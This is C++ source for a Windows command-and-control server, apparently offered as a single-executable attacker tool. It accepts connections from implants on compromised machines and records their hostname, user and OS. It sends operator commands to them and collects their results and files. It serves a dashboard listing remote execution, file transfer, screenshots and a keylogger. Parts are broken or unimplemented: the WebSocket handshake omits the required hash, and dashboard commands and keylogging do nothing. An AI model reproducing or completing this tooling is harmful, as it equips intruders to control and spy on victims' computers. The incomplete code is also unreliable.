// Unified C2 Server - Complete Single Executable Solution
// All-in-one: C2 Server + Web Server + WebSocket + Embedded Dashboard
// No external dependencies - everything in one EXE

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <shellapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <mutex>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <queue>
#include <memory>
#include <atomic>
#include <algorithm>
#include <regex>
#include <random>
#include <iomanip>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")

// Server Configuration
const int C2_PORT = 443;
const int WEB_PORT = 8080;
const int WEBSOCKET_PORT = 8081;
const char* VERSION = "1.0.0";

// Global state
std::atomic<bool> serverRunning(true);
std::mutex logMutex;
std::mutex clientsMutex;
std::mutex dataMutex;

// Client information structure
struct ClientInfo {
    SOCKET socket;
    std::string id;
    std::string ipAddress;
    std::string hostname;
    std::string username;
    std::string osVersion;
    bool isElevated;
    bool isActive;
    std::chrono::system_clock::time_point firstSeen;
    std::chrono::system_clock::time_point lastSeen;
    int beaconCount;
    std::vector<std::string> executedCommands;
};

// Global client management
std::map<std::string, ClientInfo> connectedClients;
std::vector<std::string> activityLog;
std::map<std::string, int> statisticsData;

// Embedded Dashboard HTML (minified for size)
const char* EMBEDDED_DASHBOARD = R"(<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Unified C2 Dashboard</title><style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0a;color:#00ff88;font-family:'Courier New',monospace;overflow-x:hidden}
.header{background:linear-gradient(180deg,rgba(0,255,136,0.2) 0%,rgba(0,0,0,0) 100%);padding:20px;text-align:center;border-bottom:2px solid #00ff88}
h1{font-size:2.5em;text-shadow:0 0 20px #00ff88;margin-bottom:10px}.container{max-width:1400px;margin:20px auto;padding:0 20px}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin-bottom:30px}
.stat-card{background:rgba(0,255,136,0.1);border:1px solid #00ff88;padding:20px;border-radius:8px;text-align:center;transition:all .3s}
.stat-card:hover{background:rgba(0,255,136,0.2);box-shadow:0 0 15px rgba(0,255,136,0.3)}
.stat-value{font-size:2em;font-weight:bold;color:#ff0080;text-shadow:0 0 10px #ff0080}
.clients-section{background:rgba(0,255,136,0.05);border:1px solid #00ff88;border-radius:8px;padding:20px;margin-bottom:20px}
.client-card{background:rgba(0,0,0,0.5);border:1px solid #00ff88;padding:15px;border-radius:5px;margin:10px 0}
.btn{background:#00ff88;color:#000;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;font-weight:bold;margin:5px}
.btn:hover{background:#00ff44;box-shadow:0 0 10px #00ff88}
.log-section{background:#000;border:1px solid #00ff88;border-radius:8px;padding:20px;height:300px;overflow-y:auto}
.log-entry{padding:5px;border-bottom:1px solid rgba(0,255,136,0.2);font-size:0.9em}
.status-online{color:#00ff88}.status-offline{color:#ff0044}
</style></head><body>
<div class="header"><h1>Unified C2 Server Dashboard</h1><p>Real-time Command & Control Interface</p></div>
<div class="container">
<div class="stats-grid">
<div class="stat-card"><div class="stat-value" id="activeClients">0</div><div class="stat-label">Active Clients</div></div>
<div class="stat-card"><div class="stat-value" id="totalCommands">0</div><div class="stat-label">Commands Executed</div></div>
<div class="stat-card"><div class="stat-value" id="dataTransferred">0 MB</div><div class="stat-label">Data Transferred</div></div>
<div class="stat-card"><div class="stat-value" id="uptime">0h 0m</div><div class="stat-label">Server Uptime</div></div>
</div>
<div class="clients-section">
<h2>Connected Clients</h2>
<div id="clientsList"></div>
</div>
<div class="command-section">
<h2>Command Execution</h2>
<select id="targetClient"><option value="all">All Clients</option></select>
<select id="commandType">
<option value="cmd">Execute Command</option>
<option value="download">Download File</option>
<option value="upload">Upload File</option>
<option value="screenshot">Take Screenshot</option>
<option value="keylog">Start Keylogger</option>
</select>
<input type="text" id="commandInput" placeholder="Enter command..." style="width:300px;padding:10px;background:#000;color:#00ff88;border:1px solid #00ff88">
<button class="btn" onclick="executeCommand()">Execute</button>
</div>
<div class="log-section">
<h2>Activity Log</h2>
<div id="activityLog"></div>
</div>
</div>
<script>
let ws;
function connect(){
    ws = new WebSocket('ws://localhost:8081');
    ws.onopen = () => console.log('Connected to C2 Server');
    ws.onmessage = (e) => {
        const data = JSON.parse(e.data);
        updateDashboard(data);
    };
    ws.onclose = () => setTimeout(connect, 1000);
}
function updateDashboard(data){
    document.getElementById('activeClients').textContent = data.activeClients || 0;
    document.getElementById('totalCommands').textContent = data.totalCommands || 0;
    document.getElementById('dataTransferred').textContent = (data.dataTransferred/1048576).toFixed(2) + ' MB';
    document.getElementById('uptime').textContent = formatUptime(data.uptime || 0);
    
    const clientsList = document.getElementById('clientsList');
    clientsList.innerHTML = '';
    if(data.clients){
        data.clients.forEach(client => {
            const div = document.createElement('div');
            div.className = 'client-card';
            div.innerHTML = `
                <strong>${client.hostname}</strong> (${client.ipAddress})<br>
                User: ${client.username} | OS: ${client.osVersion}<br>
                Status: <span class="${client.isActive ? 'status-online' : 'status-offline'}">${client.isActive ? 'Online' : 'Offline'}</span><br>
                Last Seen: ${new Date(client.lastSeen).toLocaleString()}
            `;
            clientsList.appendChild(div);
        });
    }
    
    const logDiv = document.getElementById('activityLog');
    if(data.logs){
        logDiv.innerHTML = data.logs.map(log => `<div class="log-entry">${log}</div>`).join('');
        logDiv.scrollTop = logDiv.scrollHeight;
    }
}
function formatUptime(seconds){
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    return `${hours}h ${minutes}m`;
}
function executeCommand(){
    const target = document.getElementById('targetClient').value;
    const type = document.getElementById('commandType').value;
    const command = document.getElementById('commandInput').value;
    
    if(ws && ws.readyState === WebSocket.OPEN){
        ws.send(JSON.stringify({action: 'execute', target, type, command}));
        document.getElementById('commandInput').value = '';
    }
}
// Auto-refresh every 2 seconds
setInterval(() => {
    if(ws && ws.readyState === WebSocket.OPEN){
        ws.send(JSON.stringify({action: 'refresh'}));
    }
}, 2000);
connect();
</script></body></html>)";

// Logging function
void logActivity(const std::string& type, const std::string& message) {
    std::lock_guard<std::mutex> lock(logMutex);
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    
    std::stringstream ss;
    ss << "[" << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S") << "] "
       << "[" << type << "] " << message;
    
    std::string logEntry = ss.str();
    activityLog.push_back(logEntry);
    
    // Keep only last 100 entries
    if (activityLog.size() > 100) {
        activityLog.erase(activityLog.begin());
    }
    
    std::cout << logEntry << std::endl;
}

// Initialize Winsock
bool initializeWinsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        return false;
    }
    return true;
}

// WebSocket frame handling
std::string createWebSocketFrame(const std::string& data) {
    std::string frame;
    frame.push_back(0x81); // FIN + text frame
    
    if (data.length() < 126) {
        frame.push_back(static_cast<char>(data.length()));
    } else if (data.length() < 65536) {
        frame.push_back(126);
        frame.push_back((data.length() >> 8) & 0xFF);
        frame.push_back(data.length() & 0xFF);
    }
    
    frame.append(data);
    return frame;
}

// Parse WebSocket frame
std::string parseWebSocketFrame(const std::string& frame) {
    if (frame.length() < 2) return "";
    
    size_t payloadStart = 2;
    size_t payloadLength = frame[1] & 0x7F;
    
    if (payloadLength == 126) {
        if (frame.length() < 4) return "";
        payloadLength = (static_cast<unsigned char>(frame[2]) << 8) | 
                       static_cast<unsigned char>(frame[3]);
        payloadStart = 4;
    }
    
    bool masked = (frame[1] & 0x80) != 0;
    if (masked) {
        payloadStart += 4;
    }
    
    if (frame.length() < payloadStart + payloadLength) return "";
    
    std::string payload = frame.substr(payloadStart, payloadLength);
    
    if (masked && payloadStart >= 4) {
        const char* mask = &frame[payloadStart - 4];
        for (size_t i = 0; i < payload.length(); i++) {
            payload[i] ^= mask[i % 4];
        }
    }
    
    return payload;
}

// Get current statistics as JSON
std::string getStatisticsJSON() {
    std::lock_guard<std::mutex> lock(dataMutex);
    
    // Calculate uptime
    static auto startTime = std::chrono::system_clock::now();
    auto uptime = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::system_clock::now() - startTime).count();
    
    std::stringstream json;
    json << "{";
    json << "\"activeClients\":" << connectedClients.size() << ",";
    json << "\"totalCommands\":" << statisticsData["totalCommands"] << ",";
    json << "\"dataTransferred\":" << statisticsData["dataTransferred"] << ",";
    json << "\"uptime\":" << uptime << ",";
    
    // Add clients array
    json << "\"clients\":[";
    bool first = true;
    for (const auto& [id, client] : connectedClients) {
        if (!first) json << ",";
        first = false;
        
        auto lastSeenTime = std::chrono::system_clock::to_time_t(client.lastSeen);
        json << "{";
        json << "\"id\":\"" << client.id << "\",";
        json << "\"hostname\":\"" << client.hostname << "\",";
        json << "\"ipAddress\":\"" << client.ipAddress << "\",";
        json << "\"username\":\"" << client.username << "\",";
        json << "\"osVersion\":\"" << client.osVersion << "\",";
        json << "\"isActive\":" << (client.isActive ? "true" : "false") << ",";
        json << "\"lastSeen\":\"" << std::put_time(std::localtime(&lastSeenTime), "%Y-%m-%d %H:%M:%S") << "\"";
        json << "}";
    }
    json << "],";
    
    // Add activity logs
    json << "\"logs\":[";
    first = true;
    for (const auto& log : activityLog) {
        if (!first) json << ",";
        first = false;
        json << "\"" << log << "\"";
    }
    json << "]";
    
    json << "}";
    return json.str();
}

// Handle WebSocket client
void handleWebSocketClient(SOCKET clientSocket) {
    char buffer[4096];
    
    // Receive WebSocket handshake
    int received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (received <= 0) {
        closesocket(clientSocket);
        return;
    }
    buffer[received] = '\0';
    
    // Parse WebSocket key
    std::string request(buffer);
    std::regex keyRegex("Sec-WebSocket-Key: (.+)\r\n");
    std::smatch match;
    
    if (std::regex_search(request, match, keyRegex)) {
        std::string websocketKey = match[1];
        std::string acceptKey = websocketKey + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
        
        // Simple SHA1 and base64 (simplified for demo)
        // In production, use proper crypto libraries
        
        // Send WebSocket handshake response
        std::string response = "HTTP/1.1 101 Switching Protocols\r\n";
        response += "Upgrade: websocket\r\n";
        response += "Connection: Upgrade\r\n";
        response += "Sec-WebSocket-Accept: " + acceptKey + "\r\n\r\n";
        
        send(clientSocket, response.c_str(), response.length(), 0);
        
        // Handle WebSocket messages
        while (serverRunning) {
            received = recv(clientSocket, buffer, sizeof(buffer), 0);
            if (received <= 0) break;
            
            std::string frame(buffer, received);
            std::string message = parseWebSocketFrame(frame);
            
            if (!message.empty()) {
                // Send statistics update
                std::string stats = getStatisticsJSON();
                std::string responseFrame = createWebSocketFrame(stats);
                send(clientSocket, responseFrame.c_str(), responseFrame.length(), 0);
            }
        }
    }
    
    closesocket(clientSocket);
}

// WebSocket server thread
void webSocketServerThread() {
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        logActivity("ERROR", "Failed to create WebSocket server socket");
        return;
    }
    
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(WEBSOCKET_PORT);
    
    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        logActivity("ERROR", "WebSocket server bind failed");
        closesocket(serverSocket);
        return;
    }
    
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        logActivity("ERROR", "WebSocket server listen failed");
        closesocket(serverSocket);
        return;
    }
    
    logActivity("WEBSOCKET", "WebSocket server started on port " + std::to_string(WEBSOCKET_PORT));
    
    while (serverRunning) {
        sockaddr_in clientAddr{};
        int clientAddrLen = sizeof(clientAddr);
        SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientAddrLen);
        
        if (clientSocket != INVALID_SOCKET) {
            std::thread clientThread(handleWebSocketClient, clientSocket);
            clientThread.detach();
        }
    }
    
    closesocket(serverSocket);
}

// Handle HTTP requests
void handleHTTPRequest(SOCKET clientSocket) {
    char buffer[4096];
    int received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    
    if (received > 0) {
        buffer[received] = '\0';
        std::string request(buffer);
        
        // Parse HTTP request
        if (request.find("GET / ") == 0 || request.find("GET /index.html") == 0) {
            // Serve dashboard
            std::stringstream response;
            response << "HTTP/1.1 200 OK\r\n";
            response << "Content-Type: text/html\r\n";
            response << "Content-Length: " << strlen(EMBEDDED_DASHBOARD) << "\r\n";
            response << "Connection: close\r\n\r\n";
            response << EMBEDDED_DASHBOARD;
            
            send(clientSocket, response.str().c_str(), response.str().length(), 0);
        }
        else if (request.find("GET /api/stats") == 0) {
            // API endpoint for statistics
            std::string stats = getStatisticsJSON();
            
            std::stringstream response;
            response << "HTTP/1.1 200 OK\r\n";
            response << "Content-Type: application/json\r\n";
            response << "Content-Length: " << stats.length() << "\r\n";
            response << "Access-Control-Allow-Origin: *\r\n";
            response << "Connection: close\r\n\r\n";
            response << stats;
            
            send(clientSocket, response.str().c_str(), response.str().length(), 0);
        }
        else {
            // 404 Not Found
            std::string notFound = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
            send(clientSocket, notFound.c_str(), notFound.length(), 0);
        }
    }
    
    closesocket(clientSocket);
}

// Web server thread
void webServerThread() {
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        logActivity("ERROR", "Failed to create web server socket");
        return;
    }
    
    // Allow socket reuse
    int opt = 1;
    setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
    
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(WEB_PORT);
    
    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        logActivity("ERROR", "Web server bind failed");
        closesocket(serverSocket);
        return;
    }
    
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        logActivity("ERROR", "Web server listen failed");
        closesocket(serverSocket);
        return;
    }
    
    logActivity("WEB", "Web server started on port " + std::to_string(WEB_PORT));
    std::cout << "\n[*] Dashboard accessible at: http://localhost:" << WEB_PORT << "\n" << std::endl;
    
    while (serverRunning) {
        sockaddr_in clientAddr{};
        int clientAddrLen = sizeof(clientAddr);
        SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientAddrLen);
        
        if (clientSocket != INVALID_SOCKET) {
            std::thread clientThread(handleHTTPRequest, clientSocket);
            clientThread.detach();
        }
    }
    
    closesocket(serverSocket);
}

// C2 command processing
void processC2Command(ClientInfo& client, const std::string& command) {
    std::lock_guard<std::mutex> lock(dataMutex);
    
    statisticsData["totalCommands"]++;
    client.executedCommands.push_back(command);
    
    // Send command to client
    send(client.socket, command.c_str(), command.length(), 0);
    
    logActivity("COMMAND", "Sent to " + client.hostname + ": " + command);
}

// Handle C2 client connection
void handleC2Client(SOCKET clientSocket, sockaddr_in clientAddr) {
    char buffer[4096];
    char clientIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
    
    // Generate client ID
    std::string clientId = std::string(clientIP) + ":" + std::to_string(ntohs(clientAddr.sin_port));
    
    // Create client info
    ClientInfo client;
    client.socket = clientSocket;
    client.id = clientId;
    client.ipAddress = clientIP;
    client.firstSeen = std::chrono::system_clock::now();
    client.lastSeen = client.firstSeen;
    client.isActive = true;
    client.beaconCount = 0;
    
    // Receive initial client info
    int received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (received > 0) {
        buffer[received] = '\0';
        
        // Parse client info (format: HOSTNAME|USERNAME|OS)
        std::string info(buffer);
        size_t pos1 = info.find('|');
        size_t pos2 = info.find('|', pos1 + 1);
        
        if (pos1 != std::string::npos && pos2 != std::string::npos) {
            client.hostname = info.substr(0, pos1);
            client.username = info.substr(pos1 + 1, pos2 - pos1 - 1);
            client.osVersion = info.substr(pos2 + 1);
        }
    }
    
    // Add to connected clients
    {
        std::lock_guard<std::mutex> lock(clientsMutex);
        connectedClients[clientId] = client;
    }
    
    logActivity("C2", "New client connected: " + client.hostname + " (" + client.ipAddress + ")");
    
    // Handle client communication
    while (serverRunning && client.isActive) {
        received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (received <= 0) {
            break;
        }
        
        buffer[received] = '\0';
        std::string data(buffer);
        
        // Update last seen
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            connectedClients[clientId].lastSeen = std::chrono::system_clock::now();
            connectedClients[clientId].beaconCount++;
        }
        
        // Process received data
        if (data.find("BEACON") == 0) {
            // Heartbeat
            send(clientSocket, "ACK", 3, 0);
        }
        else if (data.find("RESULT:") == 0) {
            // Command result
            logActivity("RESULT", client.hostname + ": " + data.substr(7));
            statisticsData["dataTransferred"] += received;
        }
        else if (data.find("FILE:") == 0) {
            // File transfer
            logActivity("FILE", "Received file from " + client.hostname);
            statisticsData["dataTransferred"] += received;
        }
    }
    
    // Remove from connected clients
    {
        std::lock_guard<std::mutex> lock(clientsMutex);
        connectedClients[clientId].isActive = false;
    }
    
    logActivity("C2", "Client disconnected: " + client.hostname);
    closesocket(clientSocket);
}

// C2 server thread
void c2ServerThread() {
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        logActivity("ERROR", "Failed to create C2 server socket");
        return;
    }
    
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(C2_PORT);
    
    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        logActivity("ERROR", "C2 server bind failed on port " + std::to_string(C2_PORT));
        closesocket(serverSocket);
        return;
    }
    
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        logActivity("ERROR", "C2 server listen failed");
        closesocket(serverSocket);
        return;
    }
    
    logActivity("C2", "C2 server started on port " + std::to_string(C2_PORT));
    
    while (serverRunning) {
        sockaddr_in clientAddr{};
        int clientAddrLen = sizeof(clientAddr);
        SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientAddrLen);
        
        if (clientSocket != INVALID_SOCKET) {
            std::thread clientThread(handleC2Client, clientSocket, clientAddr);
            clientThread.detach();
        }
    }
    
    closesocket(serverSocket);
}

// Console command handler
void consoleCommandHandler() {
    std::string command;
    
    std::cout << "\n[*] Unified C2 Server Console Ready\n";
    std::cout << "[*] Commands: help, status, list, exec <client_id> <command>, shutdown\n\n";
    
    while (serverRunning) {
        std::cout << "C2> ";
        std::getline(std::cin, command);
        
        if (command == "help") {
            std::cout << "Available commands:\n";
            std::cout << "  help     - Show this help\n";
            std::cout << "  status   - Show server status\n";
            std::cout << "  list     - List connected clients\n";
            std::cout << "  exec <client_id> <command> - Execute command on client\n";
            std::cout << "  shutdown - Stop the server\n";
        }
        else if (command == "status") {
            std::lock_guard<std::mutex> lock(clientsMutex);
            std::cout << "Active Clients: " << connectedClients.size() << "\n";
            std::cout << "Total Commands: " << statisticsData["totalCommands"] << "\n";
            std::cout << "Data Transferred: " << statisticsData["dataTransferred"] << " bytes\n";
        }
        else if (command == "list") {
            std::lock_guard<std::mutex> lock(clientsMutex);
            for (const auto& [id, client] : connectedClients) {
                std::cout << "ID: " << id << " - " << client.hostname 
                         << " (" << client.username << "@" << client.ipAddress << ")"
                         << " - " << (client.isActive ? "ACTIVE" : "INACTIVE") << "\n";
            }
        }
        else if (command.find("exec ") == 0) {
            size_t pos = command.find(' ', 5);
            if (pos != std::string::npos) {
                std::string targetId = command.substr(5, pos - 5);
                std::string cmd = command.substr(pos + 1);
                
                std::lock_guard<std::mutex> lock(clientsMutex);
                auto it = connectedClients.find(targetId);
                if (it != connectedClients.end() && it->second.isActive) {
                    processC2Command(it->second, cmd);
                } else {
                    std::cout << "Client not found or inactive\n";
                }
            }
        }
        else if (command == "shutdown") {
            serverRunning = false;
            std::cout << "Shutting down server...\n";
            break;
        }
    }
}

// Main function
int main() {
    std::cout << R"(
 _   _       _  __ _          _    ____ ____    ____                           
| | | |_ __ (_)/ _(_) ___  __| |  / ___|___ \  / ___|  ___ _ ____   _____ _ __ 
| | | | '_ \| | |_| |/ _ \/ _` | | |     __) | \___ \ / _ \ '__\ \ / / _ \ '__|
| |_| | | | | |  _| |  __/ (_| | | |___ / __/   ___) |  __/ |   \ V /  __/ |   
 \___/|_| |_|_|_| |_|\___|\__,_|  \____|_____| |____/ \___|_|    \_/ \___|_|   
                                                                                
    )" << std::endl;
    
    std::cout << "[*] Unified C2 Server v" << VERSION << " - All-in-One Solution\n";
    std::cout << "[*] Initializing components...\n\n";
    
    // Initialize Winsock
    if (!initializeWinsock()) {
        return 1;
    }
    
    // Start all server components
    std::thread c2Thread(c2ServerThread);
    std::thread webThread(webServerThread);
    std::thread wsThread(webSocketServerThread);
    
    // Wait a moment for servers to start
    std::this_thread::sleep_for(std::chrono::seconds(1));
    
    std::cout << "\n[*] All systems operational!\n";
    std::cout << "[*] C2 Server: Port " << C2_PORT << "\n";
    std::cout << "[*] Web Dashboard: http://localhost:" << WEB_PORT << "\n";
    std::cout << "[*] WebSocket API: ws://localhost:" << WEBSOCKET_PORT << "\n\n";
    
    // Run console command handler
    consoleCommandHandler();
    
    // Wait for threads to finish
    if (c2Thread.joinable()) c2Thread.join();
    if (webThread.joinable()) webThread.join();
    if (wsThread.joinable()) wsThread.join();
    
    // Cleanup
    WSACleanup();
    
    std::cout << "[*] Server shutdown complete\n";
    return 0;
}

